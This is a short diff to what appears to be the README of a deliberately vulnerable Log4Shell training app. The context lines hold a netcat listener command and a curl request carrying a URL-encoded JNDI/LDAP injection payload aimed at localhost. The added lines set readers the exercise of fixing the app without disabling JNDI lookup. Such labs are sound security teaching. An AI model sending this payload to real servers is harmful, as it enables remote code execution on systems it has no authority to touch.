@@ -106,3 +106,6 @@ nc -lv 9001
 ```shell
 curl http://localhost:8080/\?name\=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A1389%2FanyString%7D
 ```
+
+## Fix
+Try to fix this app! Don't disable JNDI Lookup, this could be usefull.
